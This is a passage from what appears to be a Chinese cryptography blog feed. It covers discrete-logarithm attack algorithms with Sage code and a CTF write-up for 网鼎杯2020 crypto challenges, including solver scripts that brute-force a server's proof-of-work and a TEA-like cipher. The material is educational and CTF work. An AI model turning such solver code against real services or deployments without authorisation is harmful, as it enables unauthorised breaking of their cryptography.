inline">\(x_{i}\)</span>均能表示作<span class="math inline">\(\alpha^{a_{i}}\beta^{b_{i}}\)</span>.</p><p>并生成mod n上的随机序列<span class="math inline">\(a,b\)</span>，有递推式如下：</p><p><span class="math inline">\(a_{i+1}=a_{i}+a[x_{i}\%psize],b_{i+1}=b_{i}+b[x_{i}\%psize]\)</span></p><p>则令初始值<span class="math inline">\(x_{0}\)</span>为<span class="math inline">\(\alpha^{ax}\)</span>（ax随机），也可表示为<span class="math inline">\(a_{0}=ax,b_{0}=0\)</span>，同时令<span class="math inline">\(y_{0}=x_{0}\)</span>，按照上述进行递推，令<span class="math inline">\(y_{i}=x_{2i}\)</span>，则发生碰撞时，我们有 <span class="math display">\[\alpha^{ax}\beta^{bx}=\alpha^{ay}\beta^{by}\\\alpha^{ay-ax}=(\alpha^{res})^{bx-by}\]</span> 在<span class="math inline">\(GCD(bx-by,n)=1\)</span>时，存在逆元，易求得<span class="math inline">\(res=(bx-by)^{-1}(ay-ax)\)</span>.</p><p>ps: sage上的<code>discrete_log_rho</code>直接做了如下判断：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ord = base.multiplicative_order()</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> ord.is_prime():</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">"for Pollard rho algorithm the order of the group must be prime"</span>)</span><br></pre></td></tr></table></figure><p>啊这- -如果<span class="math inline">\(G=F_{p}\)</span>，且阶恰好为<span class="math inline">\(p-1\)</span>时，显然会直接抛出错误，因此我做了魔改，在最后求解res的时候再进行判断，代码如下：</p><h4 id="code-1">[Code]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pollard_rho</span><span class="params">(beta, alpha, N)</span>:</span></span><br><span class="line">    ord = Mod(alpha, N).multiplicative_order()</span><br><span class="line">    partition_size = <span class="number">10</span></span><br><span class="line">    upper_bound = <span class="number">8</span> * isqrt(ord)</span><br><span class="line">    I = IntegerModRing(ord)</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> tqdm(range(<span class="number">10</span>)):</span><br><span class="line">        a = [I.random_element() <span class="keyword">for</span> i <span class="keyword">in</span> range(partition_size)]</span><br><span class="line">        b = [I.random_element() <span class="keyword">for</span> i <span class="keyword">in</span> range(partition_size)]</span><br><span class="line">        c = [power(Mod(alpha, N), a[i]) * power(Mod(beta, N), b[i]) <span class="keyword">for</span> i <span class="keyword">in</span> range(partition_size)]</span><br><span class="line">        ax = I.random_element()</span><br><span class="line">        bx = I(<span class="number">0</span>)</span><br><span class="line">        x = power(Mod(alpha, N), ax) <span class="comment"># ini</span></span><br><span class="line">        ay, by, y = ax, bx, x</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(upper_bound):</span><br><span class="line">            j = Integer(x) % partition_size</span><br><span class="line">            (x, ax, bx) = (x * c[j], ax + a[j], bx + b[j])</span><br><span class="line">            k = Integer(y) % partition_size</span><br><span class="line">            (y, ay, by) = (y * c[k], ay + a[k], by + b[k])</span><br><span class="line">            k = Integer(y) % partition_size</span><br><span class="line">            (y, ay, by) = (y * c[k], ay + a[k], by + b[k])</span><br><span class="line">            <span class="keyword">if</span> x == y:</span><br><span class="line">                <span class="keyword">if</span> ax == ay:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    res = Integer((ay - ax) / (bx - by))</span><br><span class="line">                    <span class="keyword">return</span> res</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">    print(<span class="string">"[-] Failed."</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><h3 id="pollards-λ-method">2.3 Pollard's λ-Method</h3><h4 id="theorem-2">[Theorem]</h4><p>即Pollard's Kangaroo Method，算法具体流程如下：</p><p>假设<span class="math inline">\(G(=Z_{p})\)</span>是n阶循环群，<span class="math inline">\(\alpha,\beta\in G\)</span>，满足<span class="math inline">\(\alpha^{x}=\beta.\)</span> 且我们知道<span class="math inline">\(x\in [a,b]\subset [0,p-1]\)</span>.</p><ul><li><p><span class="math inline">\(l=b-a,J=\lfloor log_{2}(l)\rfloor\)</span>，令<span class="math inline">\(S=\{randrange(1,p),...,randrange(1,p)\}=\{s(0),s(1),...,s(J-1)\}\)</span>.</p></li><li><p>Let’s begin with our tame kangaroo <em>T</em>. 令<em>T</em>从已知起始点开始跳跃，即令<span class="math inline">\(t_{0}=\alpha^{b}(mod\ p)\)</span>, 跳跃路径如下： <span class="math display">\[t(i+1)\equiv t(i)\alpha^{s(t(i)\ mod\ J)}\]</span> 让<em>T</em>在跳跃n次后停止，且有n次后的跳跃距离(指数)如下： <span class="math display">\[d(n)=\sum_{i=0}^{n-1}s(t(i)\ mod\ J)\]</span> 因此<span class="math inline">\(t(n)\equiv \alpha^{b+d(n)}\ mod\ p\)</span>.</p></li><li><p>Now we have to deal with the wild kangaroo <em>W</em>. <em>W</em>起始点<span class="math inline">\(w_{0}=\alpha^{x}\)</span>，则类似<em>T</em>有： <span class="math display">\[D(j)=\sum_{k=0}^{j-1}s(w(k)\ mod\ J),D(0)=0\]</span> <span class="math inline">\(w(j)\equiv \alpha^{x+D(j)}\ mod\ p.\)</span></p></li><li><p>当碰撞发生在<span class="math inline">\(t(i)=w(j)\)</span>时，此点向后均<span class="math inline">\(t(s)=w(r)\quad (s-i=r-j\geq 0)\)</span>. 即有 <span class="math display">\[\alpha^{x+D(m)}\equiv \alpha^{b+d(n)}\ mod\ p\]</span> 即<span class="math inline">\(x=b+d(n)-D(m)\)</span>.</p></li></ul><p>ps：将跳跃步数n取作<span class="math inline">\(\lceil\sqrt{b-a}\rceil\)</span>将使n次后已碰撞的概率趋于1，求解失败则改变<em>S</em>重新求解.</p><h4 id="code-2">[Code]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt, log2, floor, ceil</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pollard_lambda</span><span class="params">(beta, alpha, N)</span>:</span></span><br><span class="line">    a, b = <span class="number">0</span>, N - <span class="number">1</span></span><br><span class="line">    l = N - <span class="number">1</span></span><br><span class="line">    J = floor(log2(l))</span><br><span class="line">    n = ceil(sqrt(N))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range(<span class="number">10</span>)): <span class="comment">#求解次数上限</span></span><br><span class="line">        S = []</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(J):</span><br><span class="line">            r = getRandomRange(<span class="number">1</span>, l)</span><br><span class="line">            S.append((r, pow(alpha, r, N)))</span><br><span class="line">        <span class="comment"># tame kangaroo T</span></span><br><span class="line">        dt, t = b, pow(alpha, b, N)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(n):</span><br><span class="line">            r, e = S[t % J]</span><br><span class="line">            dt += r</span><br><span class="line">            t = (t * e) % N</span><br><span class="line">        <span class="comment"># wild kangaroo W</span></span><br><span class="line">        dw, w = <span class="number">0</span>, beta</span><br><span class="line">        <span class="keyword">while</span> dt - dw &gt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> w == t:</span><br><span class="line">                <span class="keyword">return</span> dt - dw</span><br><span class="line">            r, e = S[w % J]</span><br><span class="line">            dw += r</span><br><span class="line">            w = (w * e) % N</span><br><span class="line">    print(<span class="string">"[-] Failed."</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><h3 id="the-pohlig-hellman-method">2.4 The Pohlig-Hellman Method</h3><h4 id="theorem-3">[Theorem]</h4><p><span class="math inline">\(G=Zmod(n)\)</span>，<span class="math inline">\(\alpha,\beta\in G\)</span>，满足<span class="math inline">\(\alpha^{x}=\beta.\)</span> 则假设<span class="math inline">\(\alpha\)</span>的阶为<span class="math inline">\(ord\)</span>，且可表示为 <span class="math display">\[ord=\prod_{i=1}^{k}p_{i}^{r_{i}}\]</span> 则对于<span class="math inline">\(p^{r}\)</span>，有<span class="math inline">\(x\equiv x_{0}+x_{1}p+x_{2}p^{2}+...+x_{r-1}p^{r-1}\quad mod\ p^{r}\)</span>，<span class="math inline">\(0\leq x_{i}\leq p-1.\)</span></p><p>变换得<span class="math inline">\(x(\frac{ord}{p})\equiv x_{0}(\frac{ord}{p})+ord\cdot m\)</span>，<span class="math inline">\(m\in Z.\)</span></p><p>即<span class="math inline">\(\beta^{\frac{ord}{p}}\equiv \alpha^{x_{0}(\frac{ord}{p})+ord\cdot m}\equiv \alpha^{x_{0}(\frac{ord}{p})}\quad mod\ n.\)</span></p><p>而这里的<span class="math inline">\(x_{0}\)</span>则只要在<span class="math inline">\([0,p-1]\)</span>上枚举即可.</p><p>得到<span class="math inline">\(x_{0}\)</span>以后，我们用类似的trick进行<span class="math inline">\(x_{1}\)</span>的求解，有</p><p><span class="math inline">\(x(\frac{ord}{p^2})\equiv x_{0}(\frac{ord}{p^2})+x_{1}(\frac{ord}{p})+ord\cdot m&#39;\)</span>.</p><p>令<span class="math inline">\(\beta_1=\beta\alpha^{-x_{0}}\)</span>，则有<span class="math inline">\(\beta_1^{\frac{ord}{p^{2}}}\equiv (\alpha^{x}\alpha^{-x_{0}})^{\frac{ord}{p^{2}}}\equiv \alpha^{x_{1}(\frac{ord}{p})+ord*m&#39;}\equiv \alpha^{x_{1}(\frac{ord}{p})}\quad mod\ n\)</span>.</p><p><span class="math inline">\(\beta_2=\beta\alpha^{-x_0-x_1p}\)</span>，...，即升幂得到<span class="math inline">\(x\ mod\ p^{r}\)</span>.</p><p>最后对所有结果CRT即可.（对于<span class="math inline">\(p^{r}\)</span>上的求解可采用BSGS进一步减小时间复杂度）</p><h4 id="code-3">[Code]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bsgs</span><span class="params">(alpha, beta, modulus, upper_bound=None)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> upper_bound:</span><br><span class="line">        upper_bound = Mod(alpha, modulus).multiplicative_order()</span><br><span class="line">    m = ceil(sqrt(upper_bound))</span><br><span class="line">    S = &#123;pow(alpha, j, modulus):j <span class="keyword">for</span> j <span class="keyword">in</span> range(m + <span class="number">1</span>)&#125;</span><br><span class="line">    gs = Mod(alpha, modulus)^(-m)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> beta <span class="keyword">in</span> S:</span><br><span class="line">            <span class="keyword">return</span> (i * m + S[beta])</span><br><span class="line">        beta = (beta * gs) % modulus</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pohlig_hellman</span><span class="params">(beta, alpha, N)</span>:</span></span><br><span class="line">    beta, alpha = Mod(beta, N), Mod(alpha, N)</span><br><span class="line">    ord = alpha.multiplicative_order()</span><br><span class="line">    f = ord.factor()</span><br><span class="line">    prime_order_mod = [<span class="number">0</span>] * len(f)</span><br><span class="line">    <span class="keyword">for</span> i, (p, r) <span class="keyword">in</span> enumerate(f):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(r):</span><br><span class="line">            pmod = bsgs(alpha**(ord // p), (beta / alpha**prime_order_mod[i])**(ord // p**(j+<span class="number">1</span>)), N, p - <span class="number">1</span>)</span><br><span class="line">            prime_order_mod[i] += pmod * (p**j)</span><br><span class="line">    <span class="keyword">return</span> crt(prime_order_mod, [p**r <span class="keyword">for</span> (p, r) <span class="keyword">in</span> f])</span><br></pre></td></tr></table></figure><h2 id="attacking-the-elliptic-curve-discrete-logarithm-problem">Attacking the Elliptic Curve Discrete Logarithm Problem</h2><blockquote><p>Attacks on the ECDLP can be split into two main categories:</p><ol type="1"><li>attacks that work in the general setting regardless of properties of a given elliptic curve.</li><li>attacks that use specific properties of the elliptic curve to develop a different approach.</li></ol></blockquote><h3 id="general-attacks">3.1 General Attacks</h3><p>对于求解DLP/ECDLP的一般性方法，本文里的代码大多有对sage源码进行参考（且sage有轮子），但作为<strong>原理性文章</strong>，仍自己编写以加深理解or灵活修改（总不会特殊情况下有人莽到直接改sage源码吧不会吧不会吧</p><h4 id="baby-step-giant-step-algorithm-1">3.1.1 Baby-Step, Giant-Step Algorithm</h4><h5 id="theorem-4">[Theorem]</h5><p>阶为n的基点P生成<span class="math inline">\(E(F_{p})\)</span>，且<span class="math inline">\(Q\in E(F_{p})\)</span>，Q=kP.</p><p>令<span class="math inline">\(m=\lceil n\rceil\)</span>，即可将k表示为<span class="math inline">\(im+j(0\leq i,j\leq m)\)</span>. 有 <span class="math display">\[Q=kP=(im+j)P=imP+jP\\Q-i(mP)=jP\]</span> 与BSGS的DLP问题一样，建立<span class="math inline">\(j\in [0,m]\)</span>的jP字典，再遍历i寻找碰撞即可.</p><h5 id="code-4">[Code]</h5><h4 id="pollards-ρ-method-1">3.1.2 Pollard's ρ-Method</h4><h4 id="pollards-λ-method-1">3.1.3 Pollard's λ-Method</h4><h4 id="the-pohlig-hellman-method-1">3.1.4 The Pohlig-Hellman Method</h4><h5 id="theorem-5">[Theorem]</h5><p><span class="math inline">\(Q,P\in E(F_{p}),Q=kP\)</span>. 令n为P生成子群的阶，<span class="math inline">\(n=\prod_{i=1}^{k}p_{i}^{r_{i}}\)</span>.</p><p>类比DLP上的Pohlig-Hellman，我们同样要去寻找<span class="math inline">\(k_{i}\equiv k(mod\ p_{i}^{r_{i}})\)</span>.</p><p><span class="math inline">\(k\equiv x_{0}+x_{1}p+x_{2}p^{2}+...+x_{r-1}p^{r-1}\quad mod\ p^{r}\)</span>，<span class="math inline">\(0\leq x_{i}\leq p-1.\)</span></p><p>令集合<span class="math inline">\(T_{i}=\{j\frac{n}{p_{i}}P:0\leq j\leq p_{i}-1\}.\)</span>，且有</p><p><span class="math inline">\(\frac{n}{p_{i}}Q=\frac{n}{p_{i}}([x_{0}+x_{1}p_{i}+x_{2}p_{i}^2+...+x_{r-1}p_{i}^{r-1}]P)=x_{0}\frac{n}{p_{i}}P+nmP=x_{0}\frac{n}{p_{i}}P.\)</span></p><p>即可在<span class="math inline">\(T_{i}\)</span>中寻找碰撞，从而得到<span class="math inline">\(x_{0}\)</span>.</p><p>再令<span class="math inline">\(Q_{1}=Q-x_{0}P\)</span>. 计算<span class="math inline">\(\frac{n}{p_{i}^2}Q_{1}\)</span>与<span class="math inline">\(T_{i}\)</span>的碰撞，得到<span class="math inline">\(x_{1}\)</span>，继续升幂即可. 最后CRT.</p><h5 id="code-5">[Code]</h5><h3 id="specialized-attacks">3.2 Specialized Attacks</h3><h4 id="anomalous-curves">3.2.1 Anomalous Curves</h4><h4 id="the-mov-attack">3.2.2 The MOV Attack</h4><h4 id="weil-descent-and-the-ghs-attack">3.2.3 Weil Descent and the GHS Attack</h4>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Elliptic Curve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp(网鼎杯2020青龙组) - Crypto</title>
      <link href="/2020/05/10/WriteUp-%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-Crypto/"/>
      <url>/2020/05/10/WriteUp-%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-Crypto/</url>
      
        <content type="html"><![CDATA[<h3 id="preface">Preface</h3><p>Crypto出题质量挺差的...其他方向全程看队友输出（8说了线下撤硕见</p><p><img src= "/img/loading.gif" data-src="/2020/05/10/WriteUp-%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-Crypto/Rank.png"></p><h3 id="you-raise-me-up">you raise me up</h3><p><span class="math inline">\(mod\ 2^{512}\)</span>的DLP，按位恢复即可（赛后看其他师傅基本都是用的sage的<code>discrete_log</code>，扒了下源码发现这个内置函数用的PH算法，而这题的阶又足够光滑，所以也能秒出）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">2</span></span><br><span class="line">phi = <span class="number">1</span></span><br><span class="line">flag = [<span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">513</span>):</span><br><span class="line">    n *= <span class="number">2</span></span><br><span class="line">    phi *= <span class="number">2</span></span><br><span class="line">    candidate = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="keyword">if</span> pow(m, i, n) == c % n:</span><br><span class="line">            candidate.append(i)</span><br><span class="line">    flag = [x + phi <span class="keyword">for</span> x <span class="keyword">in</span> candidate] + candidate</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    print(long_to_bytes(i))</span><br></pre></td></tr></table></figure><h3 id="easy_ya">easy_ya</h3><p>先靶机交互proof_of_work拿数据（没提示明文串长度，但是一猜4就中了- -</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"39.96.90.217"</span>, <span class="string">"17497"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"= "</span>)</span><br><span class="line">suffix = io.recvline().strip().decode(<span class="string">"utf-8"</span>)</span><br><span class="line">print(suffix)</span><br><span class="line">io.recvuntil(<span class="string">"openssl_"</span>)</span><br><span class="line">mode = io.recvuntil(<span class="string">"&gt;"</span>)[:<span class="number">-1</span>].decode(<span class="string">"utf-8"</span>)</span><br><span class="line">print(mode)</span><br><span class="line">pts = itertools.product(string.printable, repeat=<span class="number">4</span>)</span><br><span class="line">len = <span class="number">100</span>**<span class="number">4</span></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> pt <span class="keyword">in</span> pts:</span><br><span class="line">    <span class="keyword">if</span> cnt % <span class="number">1000</span> == <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">"&#123;&#125;%"</span>.format(<span class="number">100</span>*cnt/len))</span><br><span class="line">    p = <span class="string">""</span>.join(list(pt))</span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">"sha1"</span>:</span><br><span class="line">        ct = sha1(p.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="string">"sha224"</span>:</span><br><span class="line">        ct = sha224(p.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="string">"sha256"</span>:</span><br><span class="line">        ct = sha256(p.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="string">"sha384"</span>:</span><br><span class="line">        ct = sha384(p.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="string">"sha512"</span>:</span><br><span class="line">        ct = sha512(p.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="string">"md5"</span>:</span><br><span class="line">        ct = md5(p.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> ct[:<span class="number">20</span>] == suffix:</span><br><span class="line">        print(p)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    cnt += <span class="number">1</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>然后GCD分解RSA模数，进而拿到Key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">136</span>, <span class="number">145</span>, <span class="number">137</span>, <span class="number">128</span>, <span class="number">136</span>, <span class="number">177</span>, <span class="number">151</span>, <span class="number">160</span>, <span class="number">191</span>, <span class="number">167</span>, <span class="number">129</span>, <span class="number">153</span>, <span class="number">178</span>, <span class="number">129</span>, <span class="number">149</span>, <span class="number">191</span>, <span class="number">174</span>, <span class="number">137</span>]</span><br></pre></td></tr></table></figure><p>拿到Key以后，又知每个分组加密后的密文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint = nhex((y &lt;&lt; <span class="number">52</span>) ^ (pads &lt;&lt; <span class="number">20</span>) ^ z)</span><br></pre></td></tr></table></figure><p>则有 <code>y = hint &gt;&gt; 52</code></p><p><code>high_pads = (cipher % (2**52)) &gt;&gt; 32 &lt;&lt; 12</code></p><p><code>low_z = cipher % (2**20)</code></p><p>中间未知的12比特直接爆破即可，又有 <code>(32 * pad) % 0x100000000 == pads</code></p><p>即pad高5位未知，同样爆破即可，编写脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">limit = <span class="keyword">lambda</span> n: n &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(cipher)</span>:</span></span><br><span class="line">    flags = []</span><br><span class="line">    a = <span class="number">2291239296</span></span><br><span class="line">    b = <span class="number">2293340064</span></span><br><span class="line">    c = <span class="number">3215425945</span></span><br><span class="line">    d = <span class="number">2994836927</span></span><br><span class="line">    high_pads = (cipher % (<span class="number">2</span>**<span class="number">52</span>)) &gt;&gt; <span class="number">32</span> &lt;&lt; <span class="number">12</span></span><br><span class="line">    mid = (cipher % (<span class="number">2</span>**<span class="number">32</span>)) &gt;&gt; <span class="number">20</span></span><br><span class="line">    low_z = cipher % (<span class="number">2</span>**<span class="number">20</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range(<span class="number">2</span>**<span class="number">12</span>)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">5</span>):</span><br><span class="line">            pads = high_pads + i</span><br><span class="line">            <span class="comment"># (32 * pad) % 0x100000000 == pads</span></span><br><span class="line">            low_pad = pads &gt;&gt; <span class="number">5</span></span><br><span class="line">            y = cipher &gt;&gt; <span class="number">52</span></span><br><span class="line">            z = ((i ^ mid) &lt;&lt; <span class="number">20</span>) + low_z</span><br><span class="line">            pad = (j &lt;&lt; <span class="number">27</span>) + low_pad</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">                z = limit(z - ((y*<span class="number">16</span> + c) ^ (y + pads) ^ ((y&gt;&gt;<span class="number">5</span>) + d)))</span><br><span class="line">                y = limit(y - ((z*<span class="number">16</span> + a) ^ (z + pads) ^ ((z&gt;&gt;<span class="number">5</span>) + b)))</span><br><span class="line">                pads = limit(pads - pad)</span><br><span class="line">            <span class="keyword">if</span> pads != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            flag = long_to_bytes(y) + long_to_bytes(z)</span><br><span class="line">            mark = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> flag:</span><br><span class="line">                <span class="keyword">if</span> <span class="number">0</span> &lt; _ &lt; <span class="number">32</span> <span class="keyword">or</span> _ &gt;= <span class="number">128</span>:</span><br><span class="line">                    mark = <span class="literal">False</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> mark == <span class="literal">True</span>:</span><br><span class="line">                flags.append(flag)</span><br><span class="line">    <span class="keyword">return</span> flags</span><br><span class="line"></span><br><span class="line">flag1 = decode(<span class="number">0xa5c5825052a4f2f97d50d</span>)</span><br><span class="line">flag2 = decode(<span class="number">0x916584dbfa561434b59a9</span>)</span><br><span class="line">flag3 = decode(<span class="number">0xd4148395b3a564bc85ef5</span>)</span><br><span class="line">flag4 = decode(<span class="number">0xb165eb6c68948a4860b12</span>)</span><br><span class="line">flag5 = decode(<span class="number">0xe698497f90f8b6fa51e0a</span>)</span><br></pre></td></tr></table></figure><p>半分钟出结果</p><p><img src= "/img/loading.gif" data-src="/2020/05/10/WriteUp-%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-Crypto/TzFGhGpqfDJCncgl.png"></p><h3 id="boom">boom</h3><p>？</p><p>md5在线查库 + 三元一次方程 + 一元二次方程（绝了</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
